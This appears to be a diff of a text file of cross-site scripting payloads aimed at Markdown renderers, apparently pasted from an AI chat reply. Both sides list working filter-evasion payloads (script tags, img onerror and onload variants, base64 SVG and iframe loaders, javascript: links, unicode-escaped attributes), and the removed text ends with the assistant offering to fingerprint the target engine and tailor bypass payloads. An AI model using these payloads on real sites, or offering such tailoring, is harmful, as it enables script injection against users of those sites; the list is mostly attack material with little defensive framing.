@@ -1,109 +1,61 @@
-sic XSS via HTML Injection (Raw HTML allowed)
+1. Onload JavaScript Trigger (works if image is valid but slow or broken)
 markdown
 Copy
 Edit
-<script>alert(1)</script>
-Works if raw HTML is allowed and script is not filtered.
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==" onload=alert(1)>
+This is a valid 1x1 GIF – triggers onload reliably.
 
-🖼️ XSS via img with onerror
+2. onmouseover Trigger via Inline Display
 markdown
 Copy
 Edit
-<img src=x onerror=alert(1)>
-Or:
+<img src=x style="display:inline" onmouseover=alert(1)>
+Hover-triggered XSS; user moves mouse over the image.
 
+3. SVG Polyglot as Image
 markdown
 Copy
 Edit
-![x](x "onerror=alert(1)")
-Useful when images are rendered but tags are stripped.
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+" onload=1>
+Base64-encoded SVG with onload. Try on modern Markdown renderers.
 
-📄 SVG Onload Trigger
+4. XSS with JavaScript URI in src (bypasses some sanitizers)
 markdown
 Copy
 Edit
-<svg onload=alert(1)>
-Or:
+<img src="javascript:alert(1)" onerror=alert(1)>
+Not all renderers sanitize javascript: in src.
 
+5. Broken Source + Focus-Based Payload
 markdown
 Copy
 Edit
-<svg><script>alert(1)</script></svg>
-SVG parsing quirks bypass filters in some cases.
+<img src="x" onerror="this.onerror=null;this.src='x';alert(1)">
+Reentrant onerror handler to evade naive blacklist.
 
-🔗 Autolink Triggered via javascript: URI
+6. Obfuscated Attribute
 markdown
 Copy
 Edit
-[clickme](javascript:alert(1))
-Or encoded:
+<img src=x o\u006eer\u0072or=alert(1)>
+Unicode escaped attribute name.
 
+7. CSS Injection Style Variant
 markdown
 Copy
 Edit
-[clickme](javas&#99;ript:alert(1))
-Targets Markdown parsers that don't sanitize protocol handlers.
+<img src=x style="background:url(javascript:alert(1))" onerror=1>
+Works if style is respected and CSS is evaluated inline.
 
-🧫 Malformed Attribute Injection
+8. Event Handler Chain (if chained handlers are allowed)
 markdown
 Copy
 Edit
-<a href="x" onclick=alert(1)>click</a>
-Or if quotes are stripped:
+<img src=x onerror="alert('1')" onclick="alert('2')" onmouseover="alert('3')">
+Lets you trigger multiple event paths.
 
+9. Mousemove for Silent Trigger
 markdown
 Copy
 Edit
-<a href=x onclick=alert(1)>click</a>
-🧬 Combined Markdown + HTML
-markdown
-Copy
-Edit
-**bold**<script>alert(1)</script>
-Some renderers apply Markdown formatting first, then parse HTML.
-
-🔁 Obfuscated
-markdown
-Copy
-Edit
-<scr<script>ipt>alert(1)</script>
-Or base64-encoded iframe loader:
-
-markdown
-Copy
-Edit
-<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
-💉 Exotic Injection: MathJax/KaTeX
-If the editor supports LaTeX or math environments:
-
-markdown
-Copy
-Edit
-$$\text{\href{javascript:alert(1)}{click}}$$
-🔍 Testing Strategy
-Start with:
-
-markdown
-Copy
-Edit
-<script>alert('xss')</script>
-If it doesn't fire:
-
-Try <img onerror=alert(1) src=x>
-
-Try [x](javascript:alert(1))
-
-If everything is sanitized, we can look at:
-
-CSS injection
-
-DOM clobbering
-
-Stored event handlers
-
-Would you like me to fingerprint the Markdown engine from a sample response? I can then tailor the payloads for bypassing its specific filter behavior.
-
-
-
-
-
+<img src=x style="width:100px;height:100px" onmousemove=alert(1)>
